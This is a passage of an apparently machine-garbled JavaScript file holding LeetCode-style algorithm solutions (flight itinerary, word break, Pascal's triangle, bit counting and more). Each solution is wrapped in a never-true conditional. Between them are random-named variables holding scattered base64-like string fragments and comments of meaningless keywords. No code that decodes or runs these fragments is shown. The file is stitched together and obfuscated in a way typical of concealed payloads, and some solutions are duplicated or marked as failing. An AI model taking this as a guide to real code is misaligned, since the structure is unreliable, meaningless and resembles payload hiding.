        } else {
            if (map[tickets[i][0]][tickets[i][1]] === undefined) {
                map[tickets[i][0]][tickets[i][1]] = 1;
            } else {
                map[tickets[i][0]][tickets[i][1]]++;
            }
        }
    }
    
    result.push('JFK');
    
    dfs(result, 0, len, map);
    
    return result;
};

function dfs(result, index, len, map) {
    if (index === len) {
        return true;
    }
    
    var cur = result[index],
        dests = map[cur],
        count,
        i;
        
    for (var dest in dests) {
        count = dests[dest];
        
        if (count > 0) {
            dests[dest]--;
            result.push(dest);
            if (dfs(result, index + 1, len, map)) {
                return true;
            }
            dests[dest]++;
            result.pop();
        }
    }
    
    return false;
}

// SOLUTION 2: GREEDY https://leetcode.com/discuss/87314/non-recursive-time-space-solution-with-detail-explanations
/**
 * @param {string[][]} tickets
 * @return {string[]}
 */
var findItinerary = function(tickets) {
    tickets.sort(function(a, b) {
       if (a[0] < b[0]) {
           return -1;
       } else if (a[0] > b[0]) {
           return 1;
       } else {
           if (a[1] < b[1]) {
               return -1;
           }
           
           return 1;
       }
    });
    
    var map = {},
        len = tickets.length,
        result = [],
        i;
        
    for (i = 0; i < len; i++) {
        if (map[tickets[i][0]] === undefined) {
            map[tickets[i][0]] = [tickets[i][1]];
        } else {
            map[tickets[i][0]].push(tickets[i][1]);
        }
    }
    
    dfs('JFK', result, map);
    
    return result;
};

function dfs(cur, result, map) {
    var arr = map[cur];
    
    while (arr && arr.length > 0) {
        dfs(arr.shift(), result, map);
    }
    
    result.unshift(cur);
}

}

// number export number event event event export world constant value export variable return loop array
    var pswnigbbmoqv = 'sYFoLOEnb';
    var pxrxpqdqgjpc = 'WN5NXp';
    var ipvimzgcwmh = 'dTITQj';
    var tqqbulwzi = 'iMjFsS';
    var zggrtlyk = 'lCkVAghp';
if (Array.isArray(7)) {
    /**
Given a string, find the length of the longest substring without repeating characters.

Examples:

Given "abcabcbb", the answer is "abc", which the length is 3.

Given "bbbbb", the answer is "b", with the length of 1.

Given "pwwkew", the answer is "wke", with the length of 3. Note that the answer must be a substring, "pwke" is a subsequence and not a substring.
*/
/**
 * @param {string} s
 * @return {number}
 */
var lengthOfLongestSubstring = function(s) {
    var len = s.length,
        max = 0,
        chars = new Set(),
        leftBound = 0,
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = s.charAt(i);
        
        if (chars.has(ch)) {
            // find the repeating character
            while (leftBound < i && s.charAt(leftBound) !== ch) {
                chars.delete(s.charAt(leftBound));
                leftBound++;
            }
            
            leftBound++;
        } else {
            chars.add(ch);
            max = Math.max(max, i - leftBound + 1);
        }
    }
    
    return max;
};

}

    var xkojj = '0d0b';
if (0.41 && false) {
    /**
Given a string s and a dictionary of words dict, add spaces in s to construct a sentence where each word is a valid dictionary word.

Return all such possible sentences.

For example, given
s = "catsanddog",
dict = ["cat", "cats", "and", "sand", "dog"].

A solution is ["cats and dog", "cat sand dog"].


*/
// Time limit exceeded...
/**
 * @param {string} s
 * @param {set<string>} wordDict
 *   Note: wordDict is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {string[]}
 */
var wordBreak = function(s, wordDict) {
    const len = s.length;
    let hasSeg = [];
    let result = [];
    let i, j;
    
    for (i = 0; i <= len; i++) {
        hasSeg.push(new Array(len + 1).fill(false));    
    }
    
    hasSeg[0][0] = true;
    
    for (i = 0; i <= len; i++) {
        for (j = i; j >= 0; j--) {
            if (wordDict.has(s.slice(j, i))) {
                hasSeg[j][i] = true;
            } else {
                for (let k = j; k < i; k++) {
                    if (hasSeg[j][k] && hasSeg[k][i]) {
                        hasSeg[j][i] = true;
                        break;
                    }
                }
            }
        }
    }
    
    helper(result, [], 0, s, wordDict, hasSeg);
    
    return result;
};

function helper(result, curArr, startIndex, s, wordDict, hasSeg) {
    if (startIndex === s.length) {
        result.push(curArr.join(' '));
    }
    
    for (let i = startIndex; i <= s.length; i++) {
        if (hasSeg[startIndex][i]) {
            if (wordDict.has(s.slice(startIndex, i))) {
                curArr.push(s.slice(startIndex, i));
                helper(result, curArr.concat(), i, s, wordDict, hasSeg);
                curArr.pop();
            }
        }
    }
}

// Memory limit exceeded
/**
 * @param {string} s
 * @param {set<string>} wordDict
 *   Note: wordDict is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {string[]}
 */
var wordBreak = function(s, wordDict) {
    let map = {};
    
    return helper(map, s, wordDict);
};

function helper(map, s, wordDict) {
    if (map.hasOwnProperty(s)) {
        return map[s];
    }
    
    let result = [];
    
    if (s.length === 0) {
        result.push('');
        return result;
    }
    
    wordDict.forEach(word => {
        if (s.startsWith(word)) {
            let subArr = helper(map, s.slice(word.length), wordDict);
            
            result.push((word + ' ' +  subArr.join(' ')).trim());
        }
    });
    
    map[s] = result;
    return result;
}

}

    var lohdjgkd = 'QXGzhM';
    var pwxyhgnsq = 'GVTQT';
    var bopwvtc = 'VPeUK';
    var aqich = 'lQaUFLSUN';
    var fsvwcaayijxr = 'opCXZ';
    var utbooqkc = 'BZ0lDQWd';
    var iwsfxmoxdojz = 'XjpyaLIFy';
    var idkuliltu = 'JQ0FvSV';
if (0.51 && false) {
    /**
Given numRows, generate the first numRows of Pascal's triangle.

For example, given numRows = 5,
Return

[
     [1],
    [1,1],
   [1,2,1],
  [1,3,3,1],
 [1,4,6,4,1]
]
*/
/**
 * @param {number} numRows
 * @return {number[][]}
 */
var generate = function(numRows) {
    var init = [],
        result = [],
        i;
        
    if (numRows === 0) {
        return result;
    }
    
    init.push(1);
    result.push(init);
    i = 1;
    
    while (i < numRows) {
        result = helper(result, ++i);
    }
    
    return result;
};

function helper(arr, k) {
    var len = arr.length,
        cur = arr[len - 1],
        result = [],
        i;
    
    result.push(1);
    
    for (i = 0; i < len - 1; i++) {
        result[i + 1] = cur[i] + cur[i + 1];
    }
    
    result.push(1);
    arr.push(result);
    
    return arr;
}

}

    var afxzjevoxj = 'CgjNHtOz';
// compile number define export object await return string number return
if (0.33 && false) {
    /**
Given a binary search tree (BST), find the lowest common ancestor (LCA) of two given nodes in the BST.

According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes v and w as the lowest node in T that has both v and w as descendants (where we allow a node to be a descendant of itself).”

        _______6______
       /              \
    ___2__          ___8__
   /      \        /      \
   0      _4       7       9
         /  \
         3   5
For example, the lowest common ancestor (LCA) of nodes 2 and 8 is 6. Another example is LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @return {TreeNode}
 */
var lowestCommonAncestor = function(root, p, q) {
    if (root === null || root === p || root === q) {
        return root;
    }
    
    if (root.val > p.val) {
        if (root.val < q.val) {
            return root;
        } else {
            return lowestCommonAncestor(root.left, p, q);
        }
    } else {
        if (root.val > q.val) {
            return root;
        } else {
            return lowestCommonAncestor(root.right, p, q);
        }
    }
};

}

    var owatmqhaya = 'ZcskaE';
if ('e' === 'Y') {
    /**
An abbreviation of a word follows the form <first letter><number><last letter>. Below are some examples of word abbreviations:

a) it                      --> it    (no abbreviation)

     1
b) d|o|g                   --> d1g

              1    1  1
     1---5----0----5--8
c) i|nternationalizatio|n  --> i18n

              1
     1---5----0
d) l|ocalizatio|n          --> l10n

Assume you have a dictionary and given a word, find whether its abbreviation is unique in the dictionary. A word's abbreviation is unique if no other word from the dictionary has the same abbreviation.

Example:

Given dictionary = [ "deer", "door", "cake", "card" ]

isUnique("dear") -> false
isUnique("cart") -> true
isUnique("cane") -> false
isUnique("make") -> true

*/
/**
 * @constructor
 * @param {string[]} dictionary
 */
var ValidWordAbbr = function(dictionary) {
    this.map = new Map();
    this.getAbbr = function(str) {
        const len = str.length;
        
        if (len <= 2) {
            return str;
        }
        
        return str.charAt(0) + (len - 2) + str.charAt(len - 1);
    };
    
    dictionary.forEach(word => {
        const abbr = this.getAbbr(word);
        
        if (!this.map.has(abbr)) {
            this.map.set(abbr, word);
        } else {
            if (this.map.get(abbr) !== word) {
                this.map.set(abbr, '');
            }
        }
    });
};

/**
 * @param {string} word
 * @return {bool}
 */
ValidWordAbbr.prototype.isUnique = function(word) {
    const abbr = this.getAbbr(word);
    
    return !this.map.has(abbr) || this.map.get(abbr) === word;
};


/**
 * Your ValidWordAbbr object will be instantiated and called as such:
 * var vwa = new ValidWordAbbr(dictionary);
 * vwa.isUnique("word");
 * vwa.isUnique("anotherWord");
 */

}

    var uhvnhhhms = 'd0bGVTNWpk';
    var prdfskb = 'ZYQIMjr';
    var siygwp = 'SEpzSUh';
if (55 > 134) {
    /**
Implement an iterator to flatten a 2d vector.

For example,
Given 2d vector =

[
  [1,2],
  [3],
  [4,5,6]
]

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,2,3,4,5,6].

Hint:

    How many variables do you need to keep track?
    Two variables is all you need. Try with x and y.
    Beware of empty rows. It could be the first few rows.
    To write correct code, think about the invariant to maintain. What is it?
    The invariant is x and y must always point to a valid point in the 2d vector. Should you maintain your invariant ahead of time or right when you need it?
    Not sure? Think about how you would implement hasNext(). Which is more complex?
    Common logic in two different places should be refactored into a common method.

*/
/**
 * @constructor
 * @param {Integer[][]} vec2d
 */
var Vector2D = function(vec2d) {
    this.vec = vec2d;
    this.row = 0;
    this.col = 0;
};


/**
 * @this Vector2D
 * @returns {boolean}
 */
Vector2D.prototype.hasNext = function() {
    if (this.vec.length === 0) {
        return false;
    }
    
    if (this.col === this.vec[this.row].length) {
        this.col = 0;
        this.row++;
    }
    
    while (this.row < this.vec.length && this.vec[this.row].length === 0) {
        this.row++;
    }
    
    if (this.row === this.vec.length) {
        return false;
    }

    return true;
};

/**
 * @this Vector2D
 * @returns {integer}
 */
Vector2D.prototype.next = function() {
    const val = this.vec[this.row][this.col];
    
    this.col++;
    
    return val;
};

/**
 * Your Vector2D will be called like this:
 * var i = new Vector2D(vec2d), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var zrojkhm = 'thaA';
    var ipptgrbyaguz = '4OE';
if (typeof document === 'undefined') {
    /**
Given a 2D binary matrix filled with 0's and 1's, find the largest rectangle containing all ones and return its area.
*/
/**
 * @param {character[][]} matrix
 * @return {number}
 */
var maximalRectangle = function(matrix) {
    var rLen = matrix.length,
        cLen,
        dp = [],
        max = 0,
        stack,
        temp,
        curRow,
        i,
        j;
    
    if (rLen === 0) {
        return 0;
    }
    
    cLen = matrix[0].length;
    
    if (cLen === 1 && rLen === 1) {
        return matrix[0][0] === "1" ? 1 : 0;
    }
    
    for (i = 0; i < rLen; i++) {
        dp.push(new Array(cLen));
        
        for (j = 0; j < cLen; j++) {
            if (matrix[i][j] === '0') {
                dp[i][j] = 0;
            } else {
                if (i === 0) {
                    dp[i][j] = 1;
                } else {
                    dp[i][j] = dp[i - 1][j] + 1;
                }
                
            }
        }
    }
    
    for (i = 0; i < rLen; i++) {
        stack = [];
        
        curRow = dp[i].concat();
        curRow.push(0);
        for (j = 0; j < cLen + 1;) {
            if (stack.length > 0 && curRow[j] <= curRow[stack[stack.length - 1]]) {
                temp = stack.pop();
                max = Math.max(max, dp[i][temp] * (stack.length === 0 ? j : j - stack[stack.length - 1] - 1));
            } else {
                stack.push(j);
                j++;
            }
        }
    }
    
    return max;
};

}

    var fmkeocgaj = 'CCHfQwe';
if (null === 1) {
    /**
Given two strings s and t, determine if they are isomorphic.

Two strings are isomorphic if the characters in s can be replaced to get t.

All occurrences of a character must be replaced with another character while preserving the order of characters. No two characters may map to the same character but a character may map to itself.

For example,
Given "egg", "add", return true.

Given "foo", "bar", return false.

Given "paper", "title", return true.

Note:
You may assume both s and t have the same length.
*/

/**
 * @param {string} s
 * @param {string} t
 * @return {boolean}
 */
var isIsomorphic = function(s, t) {
    var len = s.length,
        mapS = {},
        mapT = {},
        curS,
        curT,
        i;
        
    for (i = 0; i < len; i++) {
        curS = s.charAt(i);
        curT = t.charAt(i);
        
        if (!mapS.hasOwnProperty(curS)) {
            mapS[curS] = curT;
        } else if (mapS[curS] !== curT) {
            return false;
        }
        
        if (!mapT.hasOwnProperty(curT)) {
            mapT[curT] = curS;
        } else if (mapT[curT] !== curS) {
            return false;
        }
    }
    
    return true;
}; 

}

// bvqhq compile loop
    var spuoemlkrwj = 'KPQaiWl';
if (typeof navigator === 'undefined') {
    /**
Given a sorted integer array without duplicates, return the summary of its ranges.

For example, given [0,1,2,4,5,7], return ["0->2","4->5","7"].
*/

/**
 * @param {number[]} nums
 * @return {string[]}
 */
var summaryRanges = function(nums) {
    var len = nums.length,
        result = [],
        curStr = '',
        curLen,
        curNum,
        i;
        
    if (len === 0) {
        return result;
    }
    
    curNum = nums[0];
    curStr += curNum;
    curLen = 1;
    
    for (i = 1; i < len; i++) {
        if (curNum + 1 === nums[i]) {
            curNum++;
            curLen++;
        } else {
            if (curLen > 1) {
                curStr += '->' + curNum;
            }
            
            result.push(curStr);
            curNum = nums[i];
            curLen = 1;
            curStr = '' + curNum;
        }
    }
    
    if (curLen > 1) {
        curStr += '->' + curNum;
    }
            
    result.push(curStr);
    return result;
};

}

    var qwkkkpmtz = 'lHVjJaVzUw';
    var uimubiqvkgj = 'JRmgjigMz';
    var dhpmzrqwblaasyg = 'TG1OMGNteE';
    var xglzyguxiw = 'CEqaxNf';
// await bmgxkba code debug export define value array async script function constant hello
    var xieebbqzpvsq = 'brZEoA';
    var iwvfwbznxuw = 'xaWGtwSUNZ';
if (0.38 && false) {
    /**
The set [1,2,3,…,n] contains a total of n! unique permutations.

By listing and labeling all of the permutations in order,
We get the following sequence (ie, for n = 3):

"123"
"132"
"213"
"231"
"312"
"321"
Given n and k, return the kth permutation sequence.

Note: Given n will be between 1 and 9 inclusive.
*/
/**
 * @param {number} n
 * @param {number} k
 * @return {string}
 */
var getPermutation = function(n, k) {
    var arr = [],
        num = [],
        result = '',
        i;
    
    for (i = 1; i <= n; i++) {
        arr.push(i);
        num.push(0);
    }
    
    k = k - 1; // there're k - 1 permutations before
    i = 0;
    
    if (k === 0) {
        return arr.join('');
    }
    
    while(k > 0) {
        num[i] = parseInt(k / getFactorial(n - 1));
        k = k % getFactorial(n - 1);
        n--;
        i++;
    }
    
    for (i = 0; i < num.length; i++) {
        result += arr[num[i]];
        arr.splice(num[i], 1);
    }
    
    return result;
};

function getFactorial(n) {
    var result = 1;
    
    if (n === 0) {
        return 0;
    }
    
    while (n > 1) {
        result *= n;
        n--;
    }
    
    return result;
}

}

    var twqthoqbqk = 'Qwwpo';
if (!true && 1) {
    
/**
Given a string s, partition s such that every substring of the partition is a palindrome.

Return the minimum cuts needed for a palindrome partitioning of s.

For example, given s = "aab",
Return 1 since the palindrome partitioning ["aa","b"] could be produced using 1 cut.
*/
/**
 * @param {string} s
 * @return {number}
 */
var minCut = function(s) {
    const len = s.length;
    let dp = [];
    let cut = [];
    let i, j; 
    
    for (i = 0; i < len; i++) {
        dp.push(new Array(len).fill(false));
    }
    
    for (i = 0; i < len; i++) {
        for (j = i; j >= 0; j--) {
            if (s.charAt(j) === s.charAt(i) && (i - j < 2 || dp[j + 1][i - 1])) {
                dp[j][i] = true;
            }
        }
    }
    
    // cur[i] how many cuts from 0 to i
    cut[0] = 0;
    
    for (i = 1; i <= len; i++) {
        for (j = i; j > 0; j--) {
            if (dp[j - 1][i - 1]) {
                cut[i] = Math.min(cut[i] ? cut[i] : Number.MAX_VALUE, cut[j - 1] + 1);
            }
        }
    }
    
    return cut[len] - 1;
};

}

    var bccbvpkgorlx = 'bUNpQWdJQ0';
    var kmxlinwubopt = 'IxdjMN';
if (Array.isArray(2)) {
    /**
 * @param {number} n
 * @return {number}
 */
var numSquares = function(n) {
    var arr = [],
        i,
        j;
    
    arr[0] = 0;
    
    for (i = 1; i <= n; i++) {
        arr[i] = Number.MAX_VALUE;
    }
    
    for (i = 0; i <= n; i++) {
        for (j = 1; i + j * j <= n; j++) {
            arr[i + j * j] = Math.min(arr[i + j * j], arr[i] + 1);
        }
    }
    
    return arr[n];
};

// SOLUTION 2
/**
 * 根据四平方和定理，任意一个正整数均可表示为4个整数的平方和，其实是可以表示为4个以内的平方数之和，那么就是说返回结果只有1,2,3或4其中的一个，首先我们将数字化简一下，由于一个数如果含有因子4，那么我们可以把4都去掉，并不影响结果，比如2和8,3和12等等，返回的结果都相同，读者可自行举更多的栗子。
 * 还有一个可以化简的地方就是，如果一个数除以8余7的话，那么肯定是由4个完全平方数组成，这里就不证明了，因为我也不会证明，读者可自行举例验证。那么做完两步后，一个很大的数有可能就会变得很小了，大大减少了运算时间，下面我们就来尝试的将其拆为两个平方数之和，如果拆成功了那么就会返回1或2，因为其中一个平方数可能为0. 
 * @param {number} n
 * @return {number}
 */
var numSquares = function(n) {
    while(n % 4 === 0) {
        n /= 4;
    }
    
    if (n % 8 === 7) {
        return 4;
    }
    
    var i,
        j;
    
    // check if it's 1 or 2
    for (i = 0; i * i <= n; i++) {
        j = parseInt(Math.sqrt(n - i * i));
        if (i * i + j * j === n) {
            return (i === 0 || j === 0)? 1 : 2;
        }
    }
    
    return 3;
};

}

    var elruvqvesutjsxd = 'FnSUNBZ0';
if ('a' === 'S') {
    // Submission Result: Memory Limit Exceeded More Details 

// Last executed input:
// 123456

/**
 * @param {number} num
 * @return {number[]}
 */
 
/**
当一个数为2的整数幂的时候，1的个数为1，比如2（10) 和4(100)，8(1000)

在这之后就是前一个序列的数+1 比如 9(1001) = 1(1) + 8 (1) = 2

就是把一个数分解为小于它的最大2的整数幂 + x
*/
var countBits = function(num) {
    var result = [],
        pow = 1,
        copyOfPow = 1,
        i;
        
    result[0] = 0;
    
    for (i = 1; i <= num; i++) {
        if (i === pow) {
            result[i] = 1;
            copyOfPow = pow;
            pow *= 2;
        } else {
            result[i] = result[copyOfPow] + result[i - copyOfPow];
        }
    }
    
    return result;
};

/**
倒过来想，一个数 * 2 就是把它的二进制全部左移一位，也就是说 1的个数是相等的。

那么我们可以利用这个结论来做。

res[i /2] 然后看看最低位是否为1即可（上面*2一定是偶数，这边比如15和14除以2都是7，但是15时通过7左移一位并且+1得到，14则是直接左移）

所以res[i] = res[i >>1] + (i&1)
*/
var countBits = function(num) {
    var result = [],
        i;
        
    result[0] = 0;
    
    for (i = 1; i <= num; i++) {
       result[i] = result[i>>1] + (i & 1);
    }
    
    return result;
};

}

    var uyeydwnuxtc = 'fKfctFva';
if (58 > 160) {
    /**
Implement the following operations of a queue using stacks.

push(x) -- Push element x to the back of queue.
pop() -- Removes the element from in front of queue.
peek() -- Get the front element.
empty() -- Return whether the queue is empty.
Notes:
You must use only standard operations of a stack -- which means only push to top, peek/pop from top, size, and is empty operations are valid.
Depending on your language, stack may not be supported natively. You may simulate a stack by using a list or deque (double-ended queue), as long as you use only standard operations of a stack.
You may assume that all operations are valid (for example, no pop or peek operations will be called on an empty queue).
*/

/**
 * @constructor
 */
var Queue = function() {
    this.stack1 = []; // come in
    this.stack2 = []; // for go out
};

/**
 * @param {number} x
 * @returns {void}
 */
Queue.prototype.push = function(x) {
    var len = this.stack2.length,
        i;
    
    for (i = 0; i < len; i++) {
        this.stack1.push(this.stack2.pop());
    }
    
    this.stack1.push(x);
    
    for (i = 0; i < len + 1; i++) {
        this.stack2.push(this.stack1.pop());
    }
};

/**
 * @returns {void}
 */
Queue.prototype.pop = function() {
    this.stack2.pop();
};

/**
 * @returns {number}
 */
Queue.prototype.peek = function() {
    var x = this.stack2.pop();
    
    this.stack2.push(x);
    return x;
};

/**
 * @returns {boolean}
 */
Queue.prototype.empty = function() {
    var len = this.stack2.length;
        
    if (len === 0) {
        return true;
    }
    
    return false;
};

}

    var jgugpk = 'tDRnJ';
    var xfglwecknovi = 'BqmAnNf';
    var uhbfrirerjajkc = 'aWGt';
    var abwbwrusckfa = 'HKaFBtiXn';
    var pezlaxsskhr = '1YzJo';
if (78 > 181) {
    /**
Given n balloons, indexed from 0 to n-1. Each balloon is painted with a number on it represented by array nums. You are asked to burst all the balloons. If the you burst balloon i you will get nums[left] * nums[i] * nums[right] coins. Here left and right are adjacent indices of i. After the burst, the left and right then becomes adjacent.

Find the maximum coins you can collect by bursting the balloons wisely.

Note: 
(1) You may imagine nums[-1] = nums[n] = 1. They are not real therefore you can not burst them.
(2) 0 ≤ n ≤ 500, 0 ≤ nums[i] ≤ 100

Example:

Given [3, 1, 5, 8]

Return 167

    nums = [3,1,5,8] --> [3,5,8] -->   [3,8]   -->  [8]  --> []
   coins =  3*1*5      +  3*5*8    +  1*3*8      + 1*8*1   = 167
*/
/**
 * @param {number[]} nums
 * @return {number}
 * 
 * 状态转移方程：

dp[l][r] = max(dp[l][r], nums[l] * nums[m] * nums[r] + dp[l][m] + dp[m][r])
dp[l][r]表示扎破(l, r)范围内所有气球获得的最大硬币数，不含边界；

l与r的跨度k从2开始逐渐增大；

三重循环依次枚举范围跨度k，左边界l，中点m；右边界r = l + k；
 */
var maxCoins = function(nums) {
    var len = nums.length,
        dp = [],
        i,
        k,
        l,
        m,
        r;
        
    for (i = 0; i <= len + 1; i++) {
        dp.push(new Array(len + 1));
    }
    
    for (i = 0; i <= len + 1; i++) {
        for (k = 0; k <= len + 1; k++) {
            dp[i][k] = 0;
        }
    }
    
    nums[len + 1] = 1;
    
    for (i = len; i > 0; i--) {
        nums[i] = nums[i - 1];
    }
    
    nums[0] = 1;
    
    len += 2;
    
    for (k = 2; k < len; k++) {
        for (l = 0; l < len - k; l++) {
            r = l + k;
            
            for (m = l + 1; m < r; m++) {
                dp[l][r] = Math.max(dp[l][r], dp[l][m] + dp[m][r] + nums[l]*nums[m]*nums[r]);
            }
        }
    }
    
    return dp[0][len - 1];
};

}

    var zuthhgodqsb = 'LqJDpV';
if (85 > 151) {
    /**
Given a string containing only digits, restore it by returning all possible valid IP address combinations.

For example:
Given "25525511135",

return ["255.255.11.135", "255.255.111.35"]. (Order does not matter)
*/
/**
 * @param {string} s
 * @return {string[]}
 */
var restoreIpAddresses = function(s) {
    var result = [],
        len = s.length;
    
    if (len > 12) {
        return result;
    }
    
    helper(result, s, 0, [], len);
    
    return result;
};

function helper(result, s, index, curArr, len) {
    if (curArr.length === 4) {
        if (index === len) {
            result.push(curArr.join('.'));
        }
        return;
    }
    
    var i,
        num;
    
    // only 3 situations
    for (i = index; i < len && i <= index + 3; i++) {
        num = s.substring(index, i + 1);
        
        if (isValid(num)) {
            curArr.push(parseInt(num));
            helper(result, s, i + 1, curArr.concat(), len);
            curArr.pop();
        } 
        
    }
}

function isValid(s) {
    if (s.charAt(0) === '0') {
        return s === '0';
    }
    
    var num = parseInt(s);
    
    return num >= 0 && num <= 255;
}

}

// script string script function await import script string define event async
    var dniwwyrhedjr = 'lBPKD';
if (41 > 115) {
    /**
Given an integer n, return the number of trailing zeroes in n!.

Note: Your solution should be in logarithmic time complexity.
*/

/**
 * @param {number} n
 * @return {number}
 */
var trailingZeroes = function(n) {
    var divider = 5,
        reminder = 0;
    
    while (divider <= n) {
        reminder += Math.floor(n/divider);
        divider = divider * 5;
    }
    
    return reminder;
};

}

    var smiqatzaztozhiy = 'cFpuUWd';
    var lasvkdmhvk = 'nIPD';
// world
if (!true && 0) {
    /**
 * @param {number} n
 * @return {number}
 */
var numTrees = function(n) {
    var i,
        j,
        result = [];
    
    result[0] = 1;
    result[1] = 1;
    
    for (i = 2; i <= n; i++) {
        result[i] = 0;
        for (j = 0; j < i; j++) {
            result[i] += result[j] * result[i - 1 - j];
        }
        
    }
    return result[n];
};

}

    var gmwggzqlvlc = 'Igtq';
    var smlztfuth = 'mSHdn';
if ('y' === 'N') {
    /**
Follow up for "Unique Paths":

Now consider if some obstacles are added to the grids. How many unique paths would there be?

An obstacle and empty space is marked as 1 and 0 respectively in the grid.

For example,
There is one obstacle in the middle of a 3x3 grid as illustrated below.

[
  [0,0,0],
  [0,1,0],
  [0,0,0]
]
The total number of unique paths is 2.

Note: m and n will be at most 100.


*/
/**
 * @param {number[][]} obstacle
 * @return {number}
 */
var uniquePathsWithObstacles = function(obstacle) {
    var rLen = obstacle.length,
        matrix = [],
        cLen,
        i,
        j;
        
    if (rLen === 0) {
        return 0;    
    }
    
    cLen = obstacle[0].length;
    
    if (obstacle[0][0] === 1) {
        return 0;
    }
    
    for (i = 0; i < rLen; i++) {
        matrix.push(new Array(cLen));
    }
    
    matrix[0][0] = 1;
    for (i = 1; i < cLen; i++) {
        matrix[0][i] = (obstacle[0][i] || !matrix[0][i - 1])? 0 : 1; 
    }
    
    for (i = 1; i < rLen; i++) {
        matrix[i][0] = (obstacle[i][0] || !matrix[i - 1][0])? 0 : 1;
    }
    
    for (i = 1; i < rLen; i++) {
        for (j = 1; j < cLen; j++) {
            if (obstacle[i][j]) {
                matrix[i][j] = 0;
            } else {
                matrix[i][j] = matrix[i - 1][j] + matrix[i][j - 1];
            }
        }
    }
    
    return matrix[rLen - 1][cLen - 1];
};

}

    var fdqvpr = 'EQblOAGcQ';
    var wcfjdkpllqsbnpo = 'WlhabGJ';
if (!true && 1) {
    /**
Given a linked list, reverse the nodes of a linked list k at a time and return its modified list.

If the number of nodes is not a multiple of k then left-out nodes in the end should remain as it is.

You may not alter the values in the nodes, only nodes itself may be changed.

Only constant memory is allowed.

For example,
Given this linked list: 1->2->3->4->5

For k = 2, you should return: 2->1->4->3->5

For k = 3, you should return: 3->2->1->4->5
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
 
// iterative solution, not recommended, very easy to make mistakes
/**
 * @param {ListNode} head
 * @param {number} k
 * @return {ListNode}
 */
var reverseKGroup = function(head, k) {
    var dummy = new ListNode(0),
        i = 0,
        node = head,
        next,
        prevTail,
        curHead,
        curTail,
        nextHead,
        nextTail;
    
    while (node) {
        node = node.next;
        i++;
        
        if (i >= k) {
            break;
        }
    }
    
    if (k === 1 || i < k ) {
        return head;
    }
    
    i = 0;
    
    dummy.next = head;
    prevTail = dummy;
    node = head;
    
    while (node) {
        if (i === 0) {
            curTail = node;
            next = node.next;
            node.next = null;
            prevTail.next = node;
        } else {
            next = node.next;
            node.next = prevTail.next;
            prevTail.next = node;
        }
        
        i++;
        
        if (i === k) {
            prevTail = curTail;
            i = 0;
        }
        
        node = next;
    }
    
    if (i < k) {
        node = prevTail.next;
        prevTail.next = null;
        
        while (node) {
            next = node.next;
            node.next = prevTail.next;
            prevTail.next = node;
            node = next;
        }
    }
    
    return dummy.next;
};

// recursive
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} k
 * @return {ListNode}
 */
var reverseKGroup = function(head, k) {
    var i = 0,
        newHead = head,
        dummy = new ListNode(0),
        prev,
        cur,
        next;
    
    for (i = 0; i < k; i++) {
        if (newHead === null) {
            return head;
        }
        
        newHead = newHead.next;
    }
    
    newHead = reverseKGroup(newHead, k);
    cur = head;
    dummy.next = newHead;
    
    for (i = 0; i < k; i++) {
        next = cur.next;
        cur.next = dummy.next;
        dummy.next = cur;
        cur = next;
    }
    
    return dummy.next;
};

}

    var kqqcaou = 'MZChs';
    var tltnul = 'uUXVjMm';
    var vfgwewbh = 'QgdZYnt';
    var zwyisiy = 'hwWm5STFpY';
    var rnadvsfwe = 'ORtFrop';
    var khhncnrwgvfl = 'a3BJ';
    var yjpvblecoufj = 'nBGBS';
    var gligaqjiqlz = 'Q1ltQ2lBZ0';
    var xaoniouly = 'JcZractN';
    var xfmtp = 'lDQWdJQ0';
if (!true && 0) {
    /**
Given an array of integers, every element appears three times except for one. Find that single one.

Note:
Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?
*/

/**
 * @param {number[]} nums
 * @return {number}
 */
var singleNumber = function(nums) {
    var arr = [],
        len = nums.length,
        num,
        cur,
        result = 0,
        i,
        j;
    
    for (i = 0; i < 32; i++) {
        arr[i] = 0;
    }
    
    for (i = 0; i < len; i++) {
        num = nums[i];
        
        cur = num;
        for (j = 0; j < 32; j++) {
            if (cur === 0) {
                break;
            }
            
            arr[j] += (cur & 1);
            
            cur = (cur >> 1);
        }
    }
    
    for (i = 0; i < 32; i++) {
        result += ((arr[i] % 3) << i);
    }
    
    return result;
};

}

    var bmdqvflqjzb = 'LQJsHmXW';
if (typeof document === 'undefined') {
    /**
Implement next permutation, which rearranges numbers into the lexicographically next greater permutation of numbers.

If such arrangement is not possible, it must rearrange it as the lowest possible order (ie, sorted in ascending order).

The replacement must be in-place, do not allocate extra memory.

Here are some examples. Inputs are in the left-hand column and its corresponding outputs are in the right-hand column.
1,2,3 → 1,3,2
3,2,1 → 1,2,3
1,1,5 → 1,5,1

 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var nextPermutation = function(nums) {
    var len = nums.length,
        partiIndex,
        switchIndex,
        cur,
        i,
        k;
    
    if (len === 0 || len === 1) {
        return;
    }
    
    //find the num which breaks the increasing from the end
    for (i = len - 1; i > 0; i--) {
        if (nums[i] > nums[i - 1]) {
            partiIndex = i - 1;
            break;
        }
    }
    
    if (partiIndex === undefined) {
        for (i = 0; i < len/2 ; i++) {
            cur = nums[i];
            nums[i] = nums[len - i - 1];
            nums[len - i - 1] = cur;
        }
    } else {
        //find the number that it can be switched with
        cur = nums[partiIndex];
        for(i = len - 1; i > partiIndex; i--) {
            if (nums[i] > cur) {
                switchIndex = i;
                break;
            }
        }
    
        nums[partiIndex] = nums[switchIndex];
        nums[switchIndex] = cur;
        
        for (i = 0; i < (len - 1 - partiIndex)/2 ; i++) {
            k = i + partiIndex + 1;
            cur = nums[k];
